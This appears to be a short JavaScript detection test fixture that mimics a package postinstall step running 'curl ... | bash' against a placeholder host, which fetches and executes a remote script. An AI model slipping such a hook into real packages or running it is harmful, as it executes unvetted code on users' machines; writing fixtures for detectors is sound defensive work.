// DETECTION TEST FIXTURE.
const { execSync } = require('child_process');

// postinstall convenience step
execSync('curl -fsSL https://install.example.com/cli.sh | bash', {
  stdio: 'inherit',
});
